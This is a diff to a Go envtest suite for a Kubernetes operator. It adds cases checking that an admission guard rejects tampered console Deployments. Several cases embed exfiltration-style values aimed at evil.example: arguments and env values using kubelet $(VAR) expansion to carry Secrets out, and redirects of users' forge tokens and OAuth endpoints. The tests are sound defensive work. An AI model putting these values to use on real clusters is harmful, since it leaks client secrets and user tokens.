@@ -67,8 +67,8 @@ func TestEnvtest(t *testing.T) {
 		t.Skip("KUBEBUILDER_ASSETS unset; run `make -C operator test-envtest`")
 	}
 	env := &envtest.Environment{
-		CRDDirectoryPaths:     []string{filepath.Join("..", "..", "config", "crd", "bases")},
-		CRDs:                  append(argoStubCRDs(), exposureStubCRDs()...),
+		CRDDirectoryPaths:     []string{filepath.Join("..", "..", "config", "crd", "bases"), filepath.Join("testdata", "crds")},
+		CRDs:                  argoStubCRDs(),
 		ErrorIfCRDPathMissing: true,
 	}
 	adminCfg, err := env.Start()
@@ -487,10 +487,18 @@ func TestEnvtest(t *testing.T) {
 		routerCA := app()
 		rc := &routerCA.Spec.Template.Spec.Containers[0]
 		rc.Env = append(rc.Env, corev1.EnvVar{Name: "DOTVIRT_OAUTH_CA", Value: adminobjects.IngressCAPath})
+		// An admin's text holding $(, as the operator renders it: escaped.
+		adminText := dv.DeepCopy()
+		adminText.Spec.Branding.ProductName = "Acme $(beta)"
+		adminText.Spec.Branding.Links = []dotvirtv1alpha1.BrandingLink{{Label: "Docs $(beta)", URL: "https://docs.example/$(beta)"}}
+		literal := app()
+		literal.Spec.Template.Spec.Containers[0].Args = append(literal.Spec.Template.Spec.Containers[0].Args, "-forge-web-url=https://forge.example/$$(x)")
 		for name, d := range map[string]*appsv1.Deployment{
 			"the console as rendered": app(), "the forge as rendered": forge(),
-			"the console trusting the router CA for SSO": routerCA,
-			"a new release by digest":                    newDigest, "a new forge release by tag": newTag,
+			"the console with an admin's text holding $(": install.Deployment(adminText, "argocd", nil),
+			"an argument holding a literal $$(":           literal,
+			"the console trusting the router CA for SSO":  routerCA,
+			"a new release by digest":                     newDigest, "a new forge release by tag": newTag,
 			"a release with a new console flag": newFlag, "a release with a new forge bootstrap": newBootstrap,
 		} {
 			if err := dryApply(d); err != nil {
@@ -625,6 +633,33 @@ func TestEnvtest(t *testing.T) {
 				c := &d.Spec.Template.Spec.Containers[0]
 				c.Args = append(slices.Clone(c.Args), "-forge-url=https://evil.example")
 			}},
+			// $$ pairs as the kubelet reads it: $$$( still expands.
+			"an argument carrying a Secret past a doubled dollar": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-webhook-url=https://evil.example/$$$(DOTVIRT_FORGE_CLIENT_SECRET)")
+			}},
+			// The kubelet would put a Secret's value where $(NAME) stands.
+			"the console's webhook URL carrying a Secret": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-webhook-url=https://evil.example/$(DOTVIRT_FORGE_CLIENT_SECRET)")
+			}},
+			"the console's upload proxy URL carrying a Secret": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-upload-proxy-url=https://evil.example/$(DOTVIRT_SESSION_SECRET)")
+			}},
+			"the console's forge web URL carrying a Secret": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-forge-web-url=https://evil.example/$(DOTVIRT_OIDC_CLIENT_SECRET)")
+			}},
+			"an env value carrying a Secret": {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_PUBLIC_URL", Value: "https://evil.example/$(DOTVIRT_SESSION_SECRET)"})},
+			// Not Delegated here: users' forge tokens are not the console's to take.
+			"the console naming a forge application while not delegating":        {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_FORGE_CLIENT_ID", Value: "dotvirt"})},
+			"the console delegating to users' forge accounts no admin asked for": {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_FORGE_DELEGATED", Value: "true"})},
+			"the console delegating by flag": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-forge-delegated")
+			}},
+			"the console trusting another CA for its forge": {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_FORGE_CA", Value: adminobjects.BrandingMountPath + "/ca.crt"})},
 			// The console sends the admin's OIDC client secret to its issuer.
 			"the console signing in at an issuer no admin chose": {app, withEnv(corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: "https://evil.example"})},
 			"the console signing in at an issuer no admin chose, by flag": {app, func(d *appsv1.Deployment) {
@@ -1079,10 +1114,28 @@ func TestEnvtest(t *testing.T) {
 		// The branding ConfigMap and the OIDC client secret an admin chose: the
 		// secret reaches the console under its own env only.
 		chosen.BrandingConfigMap = "brand"
-		chosen.OIDCSecret, chosen.OIDCSecretKey, chosen.OIDCIssuer = "admin-oidc", "client-secret", "https://idp.example"
+		// An issuer holding $( (its CRD pattern admits it), rendered escaped.
+		chosen.OIDCSecret, chosen.OIDCSecretKey, chosen.OIDCIssuer = "admin-oidc", "client-secret", "https://idp.example/$(realm)"
+		// Delegated pull requests through the forge application an admin
+		// registered: users' tokens and its client secret go only where the
+		// spec says.
+		chosen.ForgeDelegated, chosen.ForgeURL, chosen.ForgeClientID = true, "https://forge.example", "dotvirt"
+		chosen.ForgeAuthorizeURL, chosen.ForgeClientSecret, chosen.ForgeClientSecretKey = "https://forge.example/login/oauth/authorize", "forge-app", "client-secret"
+		// The console as the operator renders it for that spec.
+		delegatedDV := dv.DeepCopy()
+		delegatedDV.Spec.Forge.CredentialsSecret, delegatedDV.Spec.Forge.URL = adminobjects.DefaultForgeSecret, chosen.ForgeURL
+		delegatedDV.Spec.Forge.PullRequests = "Delegated"
+		delegatedDV.Spec.Forge.UserAuth = &dotvirtv1alpha1.ForgeUserAuthSpec{ClientID: chosen.ForgeClientID, AuthorizeURL: chosen.ForgeAuthorizeURL,
+			ClientSecret: dotvirtv1alpha1.SecretKeyRef{Name: chosen.ForgeClientSecret, Key: chosen.ForgeClientSecretKey}}
+		delegated := install.Deployment(delegatedDV, "argocd", nil)
+		delegatedWith := func(env ...corev1.EnvVar) *appsv1.Deployment {
+			d := delegated.DeepCopy()
+			withEnv(env...)(d)
+			return d
+		}
 		oidc := app()
 		withEnv(fromSecret("DOTVIRT_OIDC_CLIENT_SECRET", "admin-oidc", "client-secret"),
-			corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: chosen.OIDCIssuer})(oidc)
+			corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: adminobjects.KubeletLiteral(chosen.OIDCIssuer)})(oidc)
 		oidcIssuerElsewhere := oidc.DeepCopy()
 		withEnv(corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: "https://evil.example"})(oidcIssuerElsewhere)
 		oidcElsewhere := app()
@@ -1116,19 +1169,31 @@ func TestEnvtest(t *testing.T) {
 			t.Errorf("metrics queries beside the admin's choice: err=%v, want the guard's Forbidden", err)
 		}
 		for name, o := range map[string]client.Object{
-			"the console branded from the admin's ConfigMap":  branded,
-			"the console with the admin's OIDC client secret": oidc,
-			"the forge's Ingress on its own host":             forgeIngress("forge.example", nil),
-			"the forge's HTTPRoute on its own host":           forgeRoute("forge.example"),
-			"the console's Route on its host":                 route(install.AppName, chosen.ConsoleHost, nil),
-			"the console's Ingress on its host":               ingress(install.AppName, nil),
-			"the console's HTTPRoute on its host":             httpRoute(install.AppName, nil),
+			"the console branded from the admin's ConfigMap":               branded,
+			"the console with the admin's OIDC client secret":              oidc,
+			"the console delegating through the admin's forge application": delegated,
+			"the forge's Ingress on its own host":                          forgeIngress("forge.example", nil),
+			"the forge's HTTPRoute on its own host":                        forgeRoute("forge.example"),
+			"the console's Route on its host":                              route(install.AppName, chosen.ConsoleHost, nil),
+			"the console's Ingress on its host":                            ingress(install.AppName, nil),
+			"the console's HTTPRoute on its host":                          httpRoute(install.AppName, nil),
 		} {
 			if err := dryApply(o); err != nil {
 				t.Errorf("%s: %v", name, err)
 			}
 		}
 		for name, o := range map[string]client.Object{
+			"the console sending users' forge tokens to another forge":                     delegatedWith(corev1.EnvVar{Name: "DOTVIRT_FORGE_DELEGATED_URL", Value: "https://evil.example"}),
+			"the console sending the forge application's secret to another token endpoint": delegatedWith(corev1.EnvVar{Name: "DOTVIRT_FORGE_TOKEN_URL", Value: "https://evil.example/token"}),
+			"the console sending users to another authorize page":                          delegatedWith(corev1.EnvVar{Name: "DOTVIRT_FORGE_AUTHORIZE_URL", Value: "https://evil.example/authorize"}),
+			"the console acting as another forge application":                              delegatedWith(corev1.EnvVar{Name: "DOTVIRT_FORGE_CLIENT_ID", Value: "other"}),
+			"the console with a literal forge client secret":                               delegatedWith(corev1.EnvVar{Name: "DOTVIRT_FORGE_CLIENT_SECRET", Value: "chosen-by-the-operator"}),
+			"the console with the forge client secret from another Secret":                 delegatedWith(fromSecret("DOTVIRT_FORGE_CLIENT_SECRET", adminobjects.SessionSecret, "secret")),
+			"the console with a forge client secret by flag": func() client.Object {
+				d := delegated.DeepCopy()
+				d.Spec.Template.Spec.Containers[0].Args = append(slices.Clone(d.Spec.Template.Spec.Containers[0].Args), "-forge-client-secret=x")
+				return d
+			}(),
 			"the console sending the admin's OIDC client secret to another issuer":  oidcIssuerElsewhere,
 			"the console sending the admin's OIDC client secret as its forge token": oidcElsewhere,
 			"the forge's Ingress for every host":                                    forgeIngress("", nil),
@@ -1199,6 +1264,10 @@ func TestEnvtest(t *testing.T) {
 	// refreshed from the released asset at each release; a release that cannot
 	// pass it ships with a re-install note.
 	t.Run("the operand passes the previous release's guard", func(t *testing.T) {
+		// The previous guard pins the issuer raw; this release renders it
+		// as written when it holds neither $( nor $$, so an install with a
+		// $ in its issuer still rolls forward.
+		const dollarIssuer = "https://idp.example/$tenant"
 		raw, err := os.ReadFile(filepath.Join("testdata", "guard-previous.yaml"))
 		if err != nil {
 			t.Fatal(err)
@@ -1209,7 +1278,9 @@ func TestEnvtest(t *testing.T) {
 			"${ARGO_CONTROLLER}": "argocd-application-controller", "${SPEC_IMAGE}": "", "${FORGE_INSECURE_TLS}": "false",
 			"${RELATED_IMAGE_DOTVIRT}": "", "${RELATED_IMAGE_FORGEJO}": "", "${METRICS_URL}": "", "${METRICS_TENANCY_URL}": "", "${METRICS_CA}": "",
 			"${CONSOLE_HOST}": "", "${BRANDING_CONFIGMAP}": "", "${METRICS_CA_CONFIGMAP}": "", "${FORGE_SECRET}": adminobjects.DefaultForgeSecret,
-			"${FORGE_MANAGED}": "false", "${OIDC_SECRET}": "", "${OIDC_SECRET_KEY}": "", "${OIDC_ISSUER}": "",
+			"${FORGE_MANAGED}": "false", "${OIDC_SECRET}": "", "${OIDC_SECRET_KEY}": "", "${OIDC_ISSUER}": dollarIssuer,
+			"${FORGE_DELEGATED}": "false", "${FORGE_URL}": "", "${FORGE_CLIENT_ID}": "", "${FORGE_AUTHORIZE_URL}": "", "${FORGE_TOKEN_URL}": "",
+			"${FORGE_CLIENT_SECRET}": "", "${FORGE_CLIENT_SECRET_KEY}": "",
 		} {
 			filled = strings.ReplaceAll(filled, k, v)
 		}
@@ -1258,8 +1329,11 @@ func TestEnvtest(t *testing.T) {
 		if err := admin.Get(ctx, types.NamespacedName{Namespace: "dotvirt", Name: "x"}, dv); err != nil {
 			t.Fatal(err)
 		}
+		withIssuer := dv.DeepCopy()
+		withIssuer.Spec.Auth.OIDC = &dotvirtv1alpha1.OIDCSpec{IssuerURL: dollarIssuer, ClientID: "dotvirt"}
 		for _, o := range []client.Object{
 			install.Deployment(dv, "argocd", nil),
+			install.Deployment(withIssuer, "argocd", nil),
 			install.ForgejoDeployment(dv, false, "", ""),
 			install.DotvirtClusterRoleBinding(dv),
 			install.ArgocdApplyClusterRoleBinding(dv, "argocd", "argocd-application-controller", true, true),
@@ -2469,38 +2543,6 @@ func argoStubCRDs() []*apiextensionsv1.CustomResourceDefinition {
 				Scope: apiextensionsv1.NamespaceScoped,
 				Versions: []apiextensionsv1.CustomResourceDefinitionVersion{{
 					Name: gvk.version, Served: true, Storage: true,
-					Schema: &apiextensionsv1.CustomResourceValidation{OpenAPIV3Schema: &apiextensionsv1.JSONSchemaProps{
-						Type: "object", XPreserveUnknownFields: &preserve,
-					}},
-				}},
-			},
-		})
-	}
-	return out
-}
-
-// exposureStubCRDs serve the Route and HTTPRoute kinds the console may be
-// exposed by, schemaless, so the front-door rules have something to judge.
-func exposureStubCRDs() []*apiextensionsv1.CustomResourceDefinition {
-	preserve := true
-	var out []*apiextensionsv1.CustomResourceDefinition
-	for _, k := range []struct{ group, kind, plural string }{
-		{"route.openshift.io", "Route", "routes"},
-		{"gateway.networking.k8s.io", "HTTPRoute", "httproutes"},
-	} {
-		meta := metav1.ObjectMeta{Name: k.plural + "." + k.group}
-		if strings.HasSuffix(k.group, ".k8s.io") {
-			// The apiserver asks this of any CRD in a Kubernetes-owned group.
-			meta.Annotations = map[string]string{"api-approved.kubernetes.io": "unapproved, test stub"}
-		}
-		out = append(out, &apiextensionsv1.CustomResourceDefinition{
-			ObjectMeta: meta,
-			Spec: apiextensionsv1.CustomResourceDefinitionSpec{
-				Group: k.group,
-				Names: apiextensionsv1.CustomResourceDefinitionNames{Kind: k.kind, ListKind: k.kind + "List", Plural: k.plural, Singular: strings.ToLower(k.kind)},
-				Scope: apiextensionsv1.NamespaceScoped,
-				Versions: []apiextensionsv1.CustomResourceDefinitionVersion{{
-					Name: "v1", Served: true, Storage: true,
 					Schema: &apiextensionsv1.CustomResourceValidation{OpenAPIV3Schema: &apiextensionsv1.JSONSchemaProps{
 						Type: "object", XPreserveUnknownFields: &preserve,
 					}},
